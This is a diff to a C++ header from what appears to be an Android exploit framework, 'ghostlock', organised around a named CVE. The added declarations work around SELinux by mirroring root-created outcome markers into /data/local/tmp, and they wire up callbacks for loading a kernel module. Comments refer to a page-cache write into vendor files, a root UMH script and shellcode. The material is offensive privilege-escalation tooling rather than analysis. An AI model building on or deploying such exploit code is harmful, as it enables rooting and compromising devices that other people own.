@@ -43,6 +43,8 @@
 
 namespace ghostlock::backend::cve_2026_43284 {
 
+    class LkmWindowRuntime;
+
     struct ReadOnlyChainContext final {
         int fd = -1;
     };
@@ -55,6 +57,14 @@ namespace ghostlock::backend::cve_2026_43284 {
 
     inline constexpr char kLkmSuccessMarker[] = "/dev/dfm0";
     inline constexpr char kLkmFailureMarker[] = "/dev/dfm1";
+    /* Shell-domain-readable mirrors of the markers above. /dev/dfm0 is created
+     * by the LKM's UMH script as root, and probing it from an unprivileged
+     * domain can be denied by SELinux (getattr on the device-node label), which
+     * makes the terminus time out even though the LKM succeeded. The script
+     * also touches these under /data/local/tmp (world-searchable), so the wait
+     * can observe the outcome regardless of domain. */
+    inline constexpr char kLkmSuccessMarkerAlt[] = "/data/local/tmp/.ghostlock_lkm_ok";
+    inline constexpr char kLkmFailureMarkerAlt[] = "/data/local/tmp/.ghostlock_lkm_fail";
     /* The libc++ shellcode mutex marker ("module loading in flight"). Not
      * terminal: the wait keeps polling past it. */
     inline constexpr char kLkmHookMarker[] = "/dev/df";
@@ -75,6 +85,13 @@ namespace ghostlock::backend::cve_2026_43284 {
          * used (the dev target is directly readable) and patch #1 is skipped. */
         const char *target_path = nullptr;
         bool allow_dev_carrier_path = false;
+
+        /* Delta-2 LKM residency window. When non-null make_real_chain_ops binds
+         * the three window callbacks; the caller owns the runtime (a member of
+         * ProductionResources or a staged-runner local) and it must outlive the
+         * chain. A null pointer leaves the window unbound, so a run without a
+         * wired channel never opens /dev/glk. */
+        LkmWindowRuntime *lkm_window = nullptr;
         /* Read bridge + helper write source for vendor carriers. When the App
          * cannot open the vendor target at all, make_real_chain_ops binds both
          * fallbacks so the page-cache write still completes (exp.c
@@ -151,6 +168,13 @@ namespace ghostlock::backend::cve_2026_43284 {
     steps::ChainWaitOutcome real_chain_wait_result(void *ctx,
                                                    std::uint32_t timeout_ms) noexcept;
     void real_chain_release(void *ctx) noexcept;
+
+    /* Delta-2 LKM window callbacks (ctx is &RealChainContext::page). They
+     * delegate to RealChainContext::lkm_window, which the composition root binds;
+     * a null runtime fails closed instead of pretending a channel exists. */
+    [[nodiscard]] bool real_chain_open_lkm_channel(void *ctx) noexcept;
+    [[nodiscard]] bool real_chain_run_lkm_window(void *ctx) noexcept;
+    void real_chain_close_lkm_channel(void *ctx) noexcept;
 
     [[nodiscard]] std::string_view chain_error_name(steps::ChainError error) noexcept;
     [[nodiscard]] std::string_view chain_wait_name(
